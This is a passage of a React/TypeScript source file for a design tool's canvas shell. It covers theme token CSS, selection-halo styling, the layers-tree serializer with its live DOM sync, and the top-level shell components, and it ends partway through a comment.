/**
 * @file       canvas-shell.tsx — universal input-grammar wrapper for TSX canvases
 * @scope      apps/studio/canvas-shell.tsx
 * @purpose    Mounted by `DesignCanvas` for every canvas. Stacks
 *             SelectionSetProvider + ContextMenuProvider, wires the input
 *             router to provider actions, and renders the floating chrome
 *             (ToolPalette, hover halo, selection halos, group bbox).
 *
 * Input grammar (V0.16+ universal — there's no opt-out flag):
 *
 *   Move tool (V)
 *     bare hover / click  → passes through (native interactions work)
 *     Cmd + hover         → preview halo on deepest element under cursor
 *     Cmd + click         → replace selection with deepest element
 *     Cmd + Shift + click → add deepest to selection (multi)
 *     right-click         → context menu
 *
 *   Hand tool (H)         pan-on-drag, no Space required; no selection
 *   Comment tool (C)      hover paints halo, click drops comment pin;
 *                         native interactions on artboard children fully
 *                         suppressed via capture-phase preventDefault
 *
 *   keydown V / H / C / Esc → tool switch (Esc also clears selection + menu)
 *
 * Wheel / pinch / space-pan / Cmd+0/1/+/- stay with `useViewportController`
 * (canvas-lib.tsx). The router consumes a strict non-overlapping subset.
 */

import {
  type ReactNode,
  type RefObject,
  useCallback,
  useEffect,
  useMemo,
  useRef,
  useState,
} from 'react';

import { AiBanner } from './ai-banner.tsx';
import { AnnotationsLayer } from './annotations-layer.tsx';
import { ArtboardMarqueeOverlay } from './artboard-marquee.tsx';
import {
  type ArtboardRect,
  PhotoPreviewBridge,
  SnapGuideOverlay,
  useArtboardsContext,
  useDragStateContext,
  useViewportControllerContext,
  type ViewportControllerHandle,
} from './canvas-lib.tsx';
import {
  buildEditSourceRecord,
  type EditSourceApplyFn,
  type EditSourceOp,
  type EditSourcePayload,
} from './commands/edit-source-command.ts';
import { type AlignMode, alignLabel, equalSpacingLabel } from './commands/equal-spacing-command.ts';
import { buildReorderRecord, type ReorderRevertFn } from './commands/reorder-command.ts';
import {
  ContextMenuProvider,
  type ContextRegistry,
  type ContextTarget,
  type ContextTargetKind,
  type MenuItem,
  useContextMenu,
} from './context-menu.tsx';
import { ContextualToolbar } from './contextual-toolbar.tsx';
import { CursorsOverlay } from './cursors-overlay.tsx';
import {
  buildComposeSelection,
  cssPath,
  deriveFile,
  hoverTargetToSelection,
  openCommentComposer,
  realClasses,
  resolveSelectionEl,
} from './dom-selection.ts';
import { setElementDragActive } from './drag-state.ts';
import { EqualSpacingHandles } from './equal-spacing-handles.tsx';
import { ExportDialogProvider } from './export-dialog.tsx';
import {
  crossedDragThreshold,
  type HoverTarget,
  resolveHoverTarget,
  useInputRouter,
} from './input-router.tsx';
import { ElementMarqueeOverlay } from './marquee-overlay.tsx';
import { MeasureOverlay } from './measure-overlay.tsx';
import { ParticipantsChrome } from './participants-chrome.tsx';
import { isReadOnlyCanvas } from './read-only-mode.ts';
import { mountCaret, placeCaretAt } from './text-caret.ts';
import { ToolPalette } from './tool-palette.tsx';
import { UndoHud } from './undo-hud.tsx';
import {
  AnnotationSelectionProvider,
  useAnnotationSelection,
  useAnnotationSelectionOptional,
} from './use-annotation-selection.tsx';
import { AnnotationsVisibilityProvider } from './use-annotations-visibility.tsx';
import { canvasConfirm, showCanvasToast } from './use-canvas-media-drop.tsx';
import { ChromeVisibilityProvider, useChromeVisibility } from './use-chrome-visibility.tsx';
import { useCollab } from './use-collab.tsx';
import { useCursorModifiers } from './use-cursor-modifiers.tsx';
import { ElementResizeOverlay, worldZoomFor } from './use-element-resize.tsx';
import { GridTrackHandlesOverlay } from './use-grid-track-handles.tsx';
import { useKeyboardDiscipline } from './use-keyboard-discipline.tsx';
import {
  MaybeSelectionSetProvider,
  type Selection,
  useSelectionSet,
} from './use-selection-set.tsx';
import { SpacingHandlesOverlay } from './use-spacing-handles.tsx';
import { useToolMode } from './use-tool-mode.tsx';
import { useUndoSinks, useUndoStack } from './use-undo-stack.tsx';

// ─────────────────────────────────────────────────────────────────────────────
// Styles — halos render as `position: fixed` siblings of the canvas. Reading
// element bounds via getBoundingClientRect (screen coords) keeps the 2 px
// border thickness consistent across zoom levels — CSS `zoom` on the world
// plane would otherwise scale a 2 px outline to 0.84 px at 42 % zoom (subpixel
// = invisible). No per-element class stamping is used.

// HUD / chrome token block. System-review 2026-05-27 (D-4) flagged that the
// dev-server chrome (toolbar + minimap + halos + marquee + AI banner) used
// `var(--accent, …)` which inherited the canvas DS palette — a violet StudyFi
// canvas turned the floating cursor toolbar violet. The HUD owns its own
// `--maude-hud-*` token family, set on `:root` of the canvas iframe document
// here. Canvas DSs do NOT define these names, so HUD/chrome CSS resolves
// against this block regardless of what the imported `:root { --accent: … }`
// looks like.
//
// Two sub-families:
//   • `--maude-hud-accent*` — theme-agnostic brand orange-rust. Defaults match
//     the existing inline fallback (`#d63b1f`) so the accent never changes with
//     the theme. Users who want to re-theme the HUD can set these via a
//     `<style>` block AFTER this one (CSS cascade — later wins).
//   • `--maude-chrome-*` — NEUTRAL surface/text/border family that DOES follow
//     the Maude chrome theme (system-review 2026-05-28 D9). The whole canvas-
//     shell chrome (workspace plane, dotted grid, floating toolbar, minimap,
//     zoom HUD, popovers, halos, context menu, undo HUD, presence chrome) reads
//     these instead of the DS `--bg-*`/`--fg-*` palette, so the chrome flips
//     dark↔light with the rest of the dev-server while ARTBOARDS keep the theme
//     their design system defines. The set is selected by a `data-maude-theme`
//     attribute on the iframe `documentElement`, propagated over the existing
//     `dgn:*` postMessage bridge (see CanvasRouter onMessage + app.jsx).
//
// Values mirror the Maude app-chrome neutrals (client/styles/1-tokens.css) so
// the in-iframe chrome and the outer shell read as one product. The DARK set is
// also the default (attribute absent / "dark") so a canvas that never receives
// a theme message renders coherent-dark — matching the dev-server's own default
// theme (readInitialTheme() → 'dark'). DDR — mirrors the `--maude-hud-*`
// precedent; the `data-maude-theme` attribute is deliberately SEPARATE from the
// DS `data-theme` so chrome theming never touches artboard palettes.
// Plan B (Task 7) — the in-canvas chrome now mirrors the maude DS ladder (indigo
// accent hue 268, cool-neutral hue 255) so the iframe chrome reads as one product
// with the rewritten outer shell. Accent-fg is the maude dark navy (NOT white):
// maude's bright indigo accent needs a dark fg for WCAG contrast (white/indigo
// ≈ 3:1, fails AA; navy/indigo ≈ 6.3:1). Token-only swap — no overlay logic
// changes (DDR-054). Values lifted from `.design/system/maude/colors_and_type.css`.
const HUD_TOKENS_CSS = `
:root,
:root[data-maude-theme="dark"] {
  --maude-hud-accent:        oklch(0.680 0.180 268);
  --maude-hud-accent-hover:  oklch(0.730 0.170 268);
  --maude-hud-accent-active: oklch(0.630 0.180 268);
  --maude-hud-accent-fg:     oklch(0.180 0.030 268);
  --maude-hud-accent-tint:   color-mix(in oklab, oklch(0.680 0.180 268) 16%, transparent);

  --maude-chrome-bg-0:      oklch(0.165 0.012 255);
  --maude-chrome-bg-1:      oklch(0.198 0.012 255);
  --maude-chrome-bg-2:      oklch(0.232 0.013 255);
  --maude-chrome-fg-0:      oklch(0.955 0.005 250);
  --maude-chrome-fg-1:      oklch(0.790 0.008 250);
  --maude-chrome-border:    oklch(0.290 0.012 255);
  --maude-chrome-dot:       oklch(0.340 0.012 255);
  --maude-chrome-shadow:    rgba(0, 0, 0, 0.46);
  --maude-chrome-font-mono: 'JetBrains Mono', 'Geist Mono', ui-monospace, 'SF Mono', Menlo, monospace;
}
:root[data-maude-theme="light"] {
  --maude-hud-accent:        oklch(0.520 0.195 268);
  --maude-hud-accent-hover:  oklch(0.470 0.195 268);
  --maude-hud-accent-active: oklch(0.430 0.190 268);
  --maude-hud-accent-fg:     oklch(0.995 0.004 268);
  --maude-hud-accent-tint:   color-mix(in oklab, oklch(0.520 0.195 268) 12%, transparent);

  --maude-chrome-bg-0:   oklch(0.975 0.004 255);
  --maude-chrome-bg-1:   oklch(1.000 0 0);
  --maude-chrome-bg-2:   oklch(0.987 0.003 255);
  --maude-chrome-fg-0:   oklch(0.225 0.015 260);
  --maude-chrome-fg-1:   oklch(0.400 0.014 260);
  --maude-chrome-border: oklch(0.922 0.005 255);
  --maude-chrome-dot:    oklch(0.860 0.008 255);
  --maude-chrome-shadow: color-mix(in oklab, oklch(0.225 0.015 260) 14%, transparent);
}
`;

// DDR-046 — Three-state halo language. Each state has its own border weight,
// color treatment, and geometric idiom so 8+ semantic states (hover / selected
// / member-of-multi / group / snap-sibling / snap-grid / marquee / annotation
// / active-artboard) stay visually distinct. Painting one with another's
// idiom is a regression.
const HALO_CSS = `
.dc-cv-halo {
  position: fixed;
  pointer-events: none;
  z-index: 5;
  box-sizing: border-box;
  border-radius: 2px;
  transition: opacity 60ms linear;
}
/* Hover — lighter 1.5px tinted line + white inner ring for contrast on dark
   elements. NO ring, NO ticks. Synchronous paint (no debounce). */
.dc-cv-halo--hover {
  border: 1.5px solid color-mix(in oklab, var(--maude-hud-accent, #0d99ff) 60%, transparent);
  box-shadow: inset 0 0 0 1px var(--maude-chrome-bg-0, #ffffff);
}
/* Selected (single) — 2px solid + 18% ring halo + 4 filled corner ticks.
   Ticks are <i class="tick tick-*"> children at inset:-3px, 8x8, accent fill. */
.dc-cv-halo--selected {
  border: 2px solid var(--maude-hud-accent, #0d99ff);
  box-shadow: 0 0 0 4px color-mix(in oklab, var(--maude-hud-accent, #0d99ff) 18%, transparent);
}
.dc-cv-halo--selected .tick {
  position: absolute;
  width: 8px;
  height: 8px;
  background: var(--maude-hud-accent, #0d99ff);
  border-radius: 1px;
  box-shadow: 0 0 0 1px var(--maude-chrome-bg-0, #ffffff);
}
.dc-cv-halo--selected .tick-tl { top: -3px; left: -3px; }
.dc-cv-halo--selected .tick-tr { top: -3px; right: -3px; }
.dc-cv-halo--selected .tick-bl { bottom: -3px; left: -3px; }
.dc-cv-halo--selected .tick-br { bottom: -3px; right: -3px; }
/* Selected (member of multi-selection) — 1.5 px solid full-accent outline.
   No ring, no ticks (the group bbox above carries the container signal).
   T16 / DDR-046 rev 2 — full opacity instead of 50%-tinted: tinted lines read
   as "draft / placeholder" and members would melt away inside artboards once
   the artboard border itself is 22%-tinted (T15). */
.dc-cv-halo--selected-member {
  border: 1.5px solid var(--maude-hud-accent, #0d99ff);
}
/* Group bbox — 1 px DASHED full accent + four 6 × 6 square corner handles.
   T16 / DDR-046 rev 2 — dashed is the canonical group-container affordance
   (Figma group bbox, FigJam Section drag-state, Photoshop marching ants).
   Dashed reads "ambient binding" without claiming subject-ness; the loud
   solid outlines on each MEMBER carry the active-selection signal. Corner
   handles are 6 × 6 (vs single-select's 8 × 8 ticks) so the group idiom
   reads as "thinner authority" than single-select. */
.dc-cv-group-bbox {
  position: fixed;
  pointer-events: none;
  z-index: 5;
  border: 1px dashed var(--maude-hud-accent, #0d99ff);
  border-radius: 2px;
}
.dc-cv-group-bbox .tick {
  position: absolute;
  width: 6px;
  height: 6px;
  background: var(--maude-hud-accent, #0d99ff);
  border-radius: 1px;
  box-shadow: 0 0 0 1px var(--maude-chrome-bg-0, #ffffff);
}
.dc-cv-group-bbox .tick-tl { top: -3px; left: -3px; }
.dc-cv-group-bbox .tick-tr { top: -3px; right: -3px; }
.dc-cv-group-bbox .tick-bl { bottom: -3px; left: -3px; }
.dc-cv-group-bbox .tick-br { bottom: -3px; right: -3px; }
/*
 * Active-artboard indicator — the artboard whose center sits closest to the
 * viewport midpoint after pan settles is "active" (DesignCanvas tracks this
 * for keyboard jumps + the /design:edit context anchor). DDR-046 — ring sits
 * OUTSIDE the hard drop-shadow so it's visible at any pan distance / zoom.
 * 120 ms ease-out so activation is felt, not invisible.
 */
.dc-canvas .dc-artboard[aria-current="true"] {
  /* T15 — quiet frame, single 2 px accent ring. The previous double-shadow
     (3 px ring + hard 6×6×0 offset) was readable but visually expensive once
     the frame itself lost its brutalist treatment. A 2 px ring on a 22 %
     tinted hairline reads unambiguous without claiming subject-ness. */
  box-shadow: 0 0 0 2px var(--maude-hud-accent, #0d99ff);
  transition: box-shadow 120ms cubic-bezier(0.4, 0, 0.2, 1);
}
/* Respect prefers-reduced-motion across all chrome transitions. */
@media (prefers-reduced-motion: reduce) {
  .dc-cv-halo,
  .dc-cv-group-bbox,
  .dc-canvas .dc-artboard[aria-current="true"] {
    transition: none !important;
  }
}
/* Phase 24 — per-tool cursors are owned SOLELY by use-tool-mode.tsx, which
   injects ONE unified Kenney-glyph rule ('* { cursor: <tool> !important }')
   into the same document. The old T22 per-tool '.dc-canvas[data-active-tool=…]'
   rules used to live here, but their higher specificity ('.class[attr] *'
   beats '*') silently SHADOWED the new cursors for comment/pen/arrow/hand/
   eraser — they kept showing the stale 16px glyphs (or their native fallback)
   while move/shape/sticky/text (which had no shadowing rule) correctly showed
   the Kenney set. Removing them lets the single source of truth win for every
   tool. 'data-active-tool' is still set on '.dc-canvas' (see CanvasCore) and
   keyed by canvas-lib's move-mode label cursor + use-cursor-modifiers — those
   stay. See DDR-067 / Phase 24. NOTE: keep this comment backtick-free — it
   lives inside the HALO_CSS template literal and a stray backtick closes it
   (bun parse fail, DDR-067 §6). */

/* T31 — Level of detail. Below 0.35 zoom we hide pre-attentive chrome that
   becomes visual noise (corner ticks, distance pills, active-artboard ring,
   snap pills). Above 4.0 we coax the browser into crisper text rendering.
   The "normal" band 0.35..4.0 carries the full chrome. */
.dc-canvas[data-cv-zoom-lod="low"] .dc-cv-halo .tick,
.dc-canvas[data-cv-zoom-lod="low"] .dc-cv-group-bbox .tick {
  display: none;
}
.dc-canvas[data-cv-zoom-lod="low"] .dc-snap-pill,
.dc-canvas[data-cv-zoom-lod="low"] .dc-cv-eq-pill {
  display: none;
}
.dc-canvas[data-cv-zoom-lod="low"] .dc-artboard[aria-current="true"] {
  box-shadow: none;
}
.dc-canvas[data-cv-zoom-lod="crisp"] {
  -webkit-font-smoothing: subpixel-antialiased;
  font-smooth: always;
}
/* Phase 12 (DDR-103) — inline text editing: the element being edited carries an
   accent ring + caret. plaintext-only contenteditable; commit writes to source. */
[contenteditable].dc-text-editing {
  outline: 2px solid var(--maude-hud-accent, #0d99ff);
  outline-offset: 1px;
  border-radius: 1px;
  cursor: text;
  /* Unify the caret with the annotation editors (CARET_FIX_STYLE in
     annotations-layer.tsx) — same accent, visible against any background.
     No compositing trigger here (no translateZ/will-change) so WebKit keeps
     blinking the native caret. */
  caret-color: var(--maude-hud-accent, #4a63e7);
}
/* Dogfood fix — hover affordance for the same leaf-text elements the dblclick
   handler above enters edit mode on. The :not(:empty):not(:has(> *)) selector
   proxies "all children are text nodes" (the exact isLeafText check happens
   in JS on dblclick — this only needs to be a good-enough visual hint). Loses
   to an active draw/annotation tool's !important global cursor override
   (use-tool-mode.tsx), so it only shows in Move mode, same as the edit itself.
   NOTE: keep this comment backtick-free — it lives inside a JS template
   literal and a stray backtick closes it early (bun parse fail). */
[data-cd-id]:not(:empty):not(:has(> *)):hover {
  cursor: text;
}
/* feature-4 text-gestures — the Text tool's hover affordance: the editable
   leaf the click-through would edit gets a dashed accent outline (applied by
   annotations-layer's hit-test; a plain :hover can't reach through the
   tool's input-capture overlay). */
.dc-text-editable-hover {
  outline: 1.5px dashed var(--maude-hud-accent, #4a63e7);
  outline-offset: 2px;
  border-radius: 2px;
}
/* Phase 12.1 (DDR-138) — in-canvas drag-to-reorder (Figma-style). Dragging a
   SELECTED element floats it with the cursor (via transform, applied inline —
   its box stays reserved so the origin shows empty space, and it stays in the
   zoomed world so styling + scale are preserved). A blue DIVIDER shows the
   insertion point between siblings; a dashed RING shows a container it will nest
   into. The DOM only changes on drop (no mid-drag reflow → no jank).
   NOTE: keep this comment backtick-free — it is inside the HALO_CSS template
   literal and a stray backtick closes it (DDR-067 §6). */
.dc-cv-reorder-divider {
  position: fixed;
  z-index: 8;
  pointer-events: none;
  display: none;
  background: var(--maude-hud-accent, #0d99ff);
  border-radius: 2px;
  box-shadow: 0 0 0 1px var(--maude-chrome-bg-0, #ffffff);
}
/* Drop-target container ring — shown while the pointer is over the middle of a
   container the dragged node would nest INTO. Outline only — no layout shift. */
[data-cd-id].dc-cv-reorder-into {
  outline: 2px dashed var(--maude-hud-accent, #0d99ff);
  outline-offset: -2px;
  border-radius: 2px;
}
`.trim();

function ensureHaloStyles(): void {
  if (typeof document === 'undefined') return;
  // HUD tokens MUST be injected before HALO_CSS so the cascade resolves
  // `var(--maude-hud-accent, …)` against the dev-server's brand defaults
  // even when the canvas DS's tokens.css later sets `:root { --accent: … }`.
  if (!document.getElementById('dc-cv-hud-tokens-css')) {
    const t = document.createElement('style');
    t.id = 'dc-cv-hud-tokens-css';
    t.textContent = HUD_TOKENS_CSS;
    document.head.appendChild(t);
  }
  if (document.getElementById('dc-cv-halo-css')) return;
  const s = document.createElement('style');
  s.id = 'dc-cv-halo-css';
  s.textContent = HALO_CSS;
  document.head.appendChild(s);
}

// ─────────────────────────────────────────────────────────────────────────────
// Layers tree (Phase 12 Task 4, DDR-103). The shell's Layers tab is a browsable
// tree of the active artboard's stamped (`data-cd-id`) elements. We walk the
// artboard subtree in the iframe, serialize a nested tree, and post it to the
// shell; the shell renders it + posts back `select-by-id` / `highlight`.

interface LayerNode {
  id: string;
  tag: string;
  label: string;
  type: string;
  /** Occurrence index of this id within the artboard — matches the resolver's
   *  `querySelectorAll([data-dc-screen=…] [data-cd-id=…])[index]`. */
  index: number;
  /** Authored `style.display === 'none'` — the Layers-panel eye icon's source
   *  of truth. The panel's toggle persists through `/_api/edit-css` (same
   *  route CssKnobs uses), so this must reflect the SOURCE value, not a
   *  client-only preview flag (see app.jsx `toggleVisibility`). */
  hidden: boolean;
  /** feature-4 T7 — a SYNTHETIC group row for an unstamped wrapper that holds
   *  stamped descendants. It's a structural stand-in so the tree mirrors real
   *  nesting instead of hoisting descendants up a level (the "some elements
   *  don't show up / tree is flat" bug). Non-selectable + non-draggable (it
   *  has no `data-cd-id` to address in source); its `id` is a stable
   *  `__grp:<sig>#<n>` synthetic key, never a real cd-id. */
  synthetic?: boolean;
  /** feature-4 T7c — the raw authored `data-dc-element` attr (null when unset).
   *  The rename input's before-value; `layerLabel` renders its Title-Case form. */
  dcElement?: string | null;
  children: LayerNode[];
}

function kebabToTitle(s: string): string {
  return s
    .split('-')
    .filter(Boolean)
    .map((w) => w.charAt(0).toUpperCase() + w.slice(1))
    .join(' ');
}

// Human label: data-dc-element (Title Case) → aria-label → role → tag(.class).
function layerLabel(el: Element): string {
  const dc = el.getAttribute('data-dc-element');
  if (dc) return kebabToTitle(dc);
  const aria = el.getAttribute('aria-label');
  if (aria) return aria.slice(0, 40);
  const role = el.getAttribute('role');
  if (role) return role;
  const tag = el.tagName.toLowerCase();
  const cls = realClasses(el).split(/\s+/).filter(Boolean)[0];
  return cls ? `${tag}.${cls}` : tag;
}

function layerType(el: Element): string {
  const tag = el.tagName.toLowerCase();
  const role = el.getAttribute('role') ?? '';
  const dc = el.getAttribute('data-dc-element') ?? '';
  if (tag === 'button' || role === 'button' || /(^|-)(btn|cta|button)(-|$)/.test(dc))
    return 'button';
  if (/^h[1-6]$/.test(tag) || role === 'heading') return 'heading';
  if (tag === 'input' || tag === 'textarea' || tag === 'select') return 'input';
  if (tag === 'img' || tag === 'svg' || tag === 'picture' || tag === 'video') return 'image';
  if (tag === 'a') return 'link';
  if (tag === 'ul' || tag === 'ol' || tag === 'li') return 'list';
  if (tag === 'nav') return 'nav';
  if (tag === 'form') return 'form';
  if (tag === 'p' || tag === 'span' || tag === 'label') return 'text';
  return 'box';
}

// Task L6 — the stamped-ancestor chain from an artboard body down to `el`
// (outermost first), mirroring `resolveHoverTarget`'s "top mode" climb
// (input-router.tsx) but returning every rung instead of only the outermost —
// deep-select needs the whole ladder to know what "one level deeper" means.
function stampedChainToBody(el: Element): Element[] {
  const bodyEl = el.closest('.dc-artboard-body');
  const chain: Element[] = [];
  let cur: Element | null = el;
  while (cur && cur !== bodyEl) {
    if (cur.hasAttribute('data-cd-id')) chain.push(cur);
    cur = cur.parentElement;
  }
  return chain.reverse();
}

// Task L6 — "Select layer" submenu: every DISTINCT `[data-cd-id]` ancestor in
// the full hit-stack under the cursor (topmost/frontmost first, matching
// Layers-panel order), so overlapping/deeply-nested elements a single
// elementFromPoint pick can't reach become individually selectable.
// `elementsFromPoint` (unlike `elementFromPoint`) walks the WHOLE z-order
// stack — including non-ancestor siblings visually underneath the frontmost
// hit — so this also disambiguates true overlaps, not just nesting depth.
function buildSelectLayerSubmenu(
  target: ContextTarget,
  selSet: { replace: (s: Selection | Selection[]) => void }
): MenuItem[] {
  if (typeof document === 'undefined' || typeof document.elementsFromPoint !== 'function') {
    return [];
  }
  const hits = document.elementsFromPoint(target.clientX, target.clientY);
  const seen = new Set<Element>();
  const candidates: Element[] = [];
  for (const hit of hits) {
    const stamped = hit.closest?.('[data-cd-id]') ?? null;
    if (!stamped || seen.has(stamped)) continue;
    seen.add(stamped);
    candidates.push(stamped);
  }
  if (candidates.length === 0) {
    return [
      {
        id: 'select-layer-empty',
        label: 'No stamped elements here',
        disabled: true,
        onSelect: () => {},
      },
    ];
  }
  return candidates.map((el, i) => {
    const cdId = el.getAttribute('data-cd-id') ?? '';
    const artboardId =
      (el.closest('[data-dc-screen]') as HTMLElement | null)?.getAttribute('data-dc-screen') ??
      null;
    return {
      id: `select-layer-${i}`,
      label: `${layerLabel(el)} · ${layerType(el)}`,
      onSelect: () => {
        // `hoverTargetToSelection` computes the occurrence index itself
        // (`selectorIndex` against the scoped selector) — no need to pass one.
        selSet.replace(
          hoverTargetToSelection({ el, cdId: cdId || null, artboardId } as HoverTarget)
        );
      },
    };
  });
}

// feature-4 T7 — does this subtree contain ANY stamped element? Gates whether an
// unstamped wrapper is worth a synthetic group row (an empty/decorative wrapper
// with no addressable descendants stays omitted — no noise).
function hasStampedDescendant(el: Element): boolean {
  return !!el.querySelector('[data-cd-id]');
}

export function serializeArtboardTree(root: Element): LayerNode[] {
  const seen = new Map<string, number>();
  // Occurrence counter for synthetic group signatures so their keys are stable
  // + unique across re-serializations (collapse state persists through HMR).
  const groupSeen = new Map<string, number>();
  function walk(el: Element): LayerNode[] {
    const out: LayerNode[] = [];
    for (const child of Array.from(el.children)) {
      // Skip dev-server overlay chrome (pins, halos) that lives inside the artboard.
      if (child.closest('.dgn-pin, .dc-cv-halo, .dc-cv-group-bbox')) continue;
      const cd = child.getAttribute('data-cd-id');
      if (cd) {
        const idx = seen.get(cd) ?? 0;
        seen.set(cd, idx + 1);
        out.push({
          id: cd,
          tag: child.tagName.toLowerCase(),
          label: layerLabel(child),
          type: layerType(child),
          index: idx,
          hidden: (child as HTMLElement).style.display === 'none',
          dcElement: child.getAttribute('data-dc-element'),
          children: walk(child),
        });
      } else if (hasStampedDescendant(child)) {
        // ENGINE chrome wrappers (`.dc-artboard-body`, any `dc-*` layer) are
        // not user structure — hoist THROUGH them (pre-feature-4 behavior) so
        // the tree doesn't grow a phantom "dc-artboard-body GROUP" root row
        // (live-dogfood finding, 2026-07-19).
        const classes = Array.from(child.classList);
        if (classes.some((c) => c.startsWith('dc-') || c.startsWith('dgn-'))) {
          out.push(...walk(child));
          continue;
        }
        // feature-4 T7 — unstamped wrapper WITH stamped descendants: emit a
        // synthetic, non-selectable GROUP row so the tree mirrors real nesting
        // instead of hoisting its descendants up a level. (Pre-feature-4 this
        // branch did `out.push(...walk(child))`, flattening the hierarchy — the
        // "layers are flat / an element is at the wrong depth" report.)
        const tag = child.tagName.toLowerCase();
        const cls = realClasses(child).split(/\s+/).filter(Boolean)[0];
        const sig = cls ? `${tag}.${cls}` : tag;
        const n = groupSeen.get(sig) ?? 0;
        groupSeen.set(sig, n + 1);
        out.push({
          id: `__grp:${sig}#${n}`,
          tag,
          label: layerLabel(child),
          type: 'group',
          index: 0,
          hidden: false,
          synthetic: true,
          children: walk(child),
        });
      }
      // Unstamped wrapper with NO stamped descendants → omitted (decorative).
    }
    return out;
  }
  return walk(root);
}

// The artboard whose Layers tree the shell is currently showing. Set every time
// we post a tree (request-layers / selection); the live MutationObserver
// (LayersLiveSync) re-posts THIS artboard whenever its DOM structure changes, so
// the panel mirrors the canvas both ways (drag/keyboard reorder + HMR reload)
// with FRESH data-cd-ids — no stale-optimistic-tree drift.
//
// Stored on `window` (NOT a module `let`): a source edit triggers a SOFT HMR
// that re-evaluates this module — a module-scoped var would reset to null and
// the observer would bail right when it matters (post-reorder). The iframe
// window survives the soft HMR, so the tracked artboard persists across it.
function getLastLayersArtboardId(): string | null {
  try {
    return (
      (window as unknown as { __maudeLastLayersArt?: string | null }).__maudeLastLayersArt ?? null
    );
  } catch {
    return null;
  }
}

// DDR-148 — an artboard hosting a <VideoComp> stamps a `[data-comp-id]`
// element inside it (see video-comp.tsx). Gates the artboard-chrome context
// menu's "Open Timeline" entry to artboards that actually have a sequence.
// T2 (feature-1-artboard-kinds-foundation) — merged with the resolved `kind`:
// an explicit `kind="video"` (DCArtboard's `data-dc-kind` readback) also
// qualifies, even before any `<VideoComp>` content exists yet; the structural
// `[data-comp-id]` check stays as the fallback for unmigrated canvases.
function artboardHasVideo(artboardId: string | null | undefined): boolean {
  if (typeof document === 'undefined' || !artboardId) return false;
  try {
    const root = document.querySelector(`[data-dc-screen="${CSS.escape(artboardId)}"]`);
    if (!root) return false;
    if (root.getAttribute('data-dc-kind') === 'video') return true;
    return !!root.querySelector('[data-comp-id]');
  } catch {
    return false;
  }
}

function postLayersTree(artboardId: string | null | undefined): void {
  if (typeof document === 'undefined' || !artboardId) return;
  const root = document.querySelector(`[data-dc-screen="${CSS.escape(artboardId)}"]`);
  if (!root) return;
  try {
    (window as unknown as { __maudeLastLayersArt?: string | null }).__maudeLastLayersArt =
      artboardId;
  } catch {
    /* no window */
  }
  try {
    window.parent.postMessage(
      { dgn: 'layers-tree', artboardId, tree: serializeArtboardTree(root) },
      '*'
    );
  } catch {
    /* detached / cross-origin */
  }
}

// Live-sync the Layers panel to the canvas DOM. A structural change anywhere in
// the artboard (an in-canvas reorder's live reflow, a drop, or the HMR remount
// after ANY source write) re-serializes + re-posts the tracked artboard's tree.
// Chrome-only churn (halo / divider / pins / activity rim, all appended to body)
// is ignored so we don't thrash. Debounced; the tree walk skips dev-server chrome
// already (serializeArtboardTree).
const LAYERS_CHROME_SEL =
  '.dc-cv-halo, .dc-cv-group-bbox, .dgn-pin, .dc-cv-reorder-divider, .dc-cv-reorder-into, .dc-activity-rim, .dc-activity-scan, .dc-cv-reorder-lift';

function LayersLiveSync() {
  useEffect(() => {
    if (typeof MutationObserver === 'undefined' || typeof document === 'undefined') return;
    const isChrome = (n: Node): boolean =>
      n.nodeType === 1 && !!(n as Element).closest?.(LAYERS_CHROME_SEL);
    let timer: ReturnType<typeof setTimeout> | null = null;
    const obs = new MutationObserver((records) => {
      let structural = false;
      for (const r of records) {
        if (r.type !== 'childList') continue;
        if (r.target.nodeType === 1 && (r.target as Element).closest?.(LAYERS_CHROME_SEL)) continue;
        const touched = [...r.addedNodes, ...r.removedNodes];
        if (touched.length && touched.every(isChrome)) continue; // pure chrome churn
        structural = true;
        break;
      }
      const art = getLastLayersArtboardId();
      if (!structural || !art) return;
      if (timer) clearTimeout(timer);
      timer = setTimeout(() => postLayersTree(art), 90);
    });
    obs.observe(document.body, { childList: true, subtree: true });
    return () => {
      if (timer) clearTimeout(timer);
      obs.disconnect();
    };
  }, []);
  return null;
}

// ─────────────────────────────────────────────────────────────────────────────
// Shell

export function CanvasShell({
  hostRef,
  children,
}: {
  hostRef: RefObject<HTMLDivElement | null>;
  children: ReactNode;
}) {
  ensureHaloStyles();

  // theme-default-follow — every un-pinned artboard tracks the chrome theme.
  // When it flips (the theme postMessage handler in CanvasRouter updates
  // `data-maude-theme` on <html>), re-theme them. A single observer per canvas
  // (cleaned up on unmount) — no per-artboard listeners to leak. The rule is a
  // CSS block keyed by data-dc-screen (see rebuildArtboardThemeStyle), so it
  // survives React re-renders without flicker.
  useEffect(() => {
    if (typeof MutationObserver === 'undefined' || typeof document === 'undefined') return;
    const obs = new MutationObserver(() => applyArtboardFollowers());
    obs.observe(document.documentElement, {
      attributes: true,
      attributeFilter: ['data-maude-theme'],
    });
    // Initial follow — theme every un-pinned artboard once the DS stylesheet has
    // parsed. The observer only fires on a `data-maude-theme` CHANGE, which may
    // not happen on first paint (the chrome theme can already equal the canvas
    // default), so first paint needs its own trigger. `window 'load'` guarantees
    // every <link>/<style> sheet is parsed → collectThemeDeclarations sees the
    // DS tokens. Runs immediately if the document is already complete.
    let onLoad: (() => void) | null = null;
    if (document.readyState === 'complete') {
      applyArtboardFollowers();
    } else {
      onLoad = () => applyArtboardFollowers();
      window.addEventListener('load', onLoad, { once: true });
    }
    return () => {
      obs.disconnect();
      if (onLoad) window.removeEventListener('load', onLoad);
    };
  }, []);

  // ToolProvider is mounted by DesignCanvas one level up (so the viewport
  // controller's `isPanDragActive` predicate can read the live tool state).
  // SelectionSetProvider is mounted via MaybeSelectionSetProvider — the shell-
  // owned comment mount layer provides one, in which case CanvasShell consumes
  // that single instance so the comment router + halos share one selection set.
  return (
    <MaybeSelectionSetProvider>
      <AnnotationSelectionProvider>
        <AnnotationsVisibilityProvider>
          <ChromeVisibilityProvider>
            <CanvasCore hostRef={hostRef}>{children}</CanvasCore>
          </ChromeVisibilityProvider>
        </AnnotationsVisibilityProvider>
      </AnnotationSelectionProvider>
    </MaybeSelectionSetProvider>
  );
}

// ─────────────────────────────────────────────────────────────────────────────
// CanvasCore — sits inside SelectionSetProvider, builds the menu registry
// against the live viewport controller + selection set, then mounts
// ContextMenuProvider + CanvasRouter.

function CanvasCore({
  hostRef,
  children,
}: {
  hostRef: RefObject<HTMLDivElement | null>;
  children: ReactNode;
}) {
  const controller = useViewportControllerContext();
  const selSet = useSelectionSet();
  const { tool } = useToolMode();

  // Project active tool to `.dc-canvas[data-active-tool]` so the cursor
  // override CSS rules (HALO_CSS) can force the tool cursor across every
